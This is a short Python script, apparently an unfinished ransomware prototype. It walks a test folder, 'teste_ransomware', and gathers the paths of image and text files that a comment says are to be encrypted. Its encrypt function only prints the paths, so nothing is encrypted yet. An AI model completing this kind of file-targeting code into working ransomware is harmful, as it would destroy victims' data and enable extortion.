import os
import pyaes

arquivos_brutos = []
pastas = []
caminho = []
lista_de_arquivo = []
path_completo = []
lista_de_extensoes = ["JPG", "png", "txt"]  #Adicionar as extensões que vão ser criptografadas

def encrypt(caminho):
    for cada_arquivo in caminho:
        print(cada_arquivo)

for root, dirs, files in os.walk("C:\\Users\\vinicius\\Documents\\teste_ransomware"):

    arquivos_brutos.append(files)
    for arquivos_diversos in arquivos_brutos:

        for arquivo in arquivos_diversos:

            if arquivo not in lista_de_arquivo:
                for extensao in lista_de_extensoes:
                    if extensao in arquivo:
                        lista_de_arquivo.append(arquivo)
                        path_completo.append(f"{root}"+ "\\" + f"{arquivo}")

encrypt(path_completo)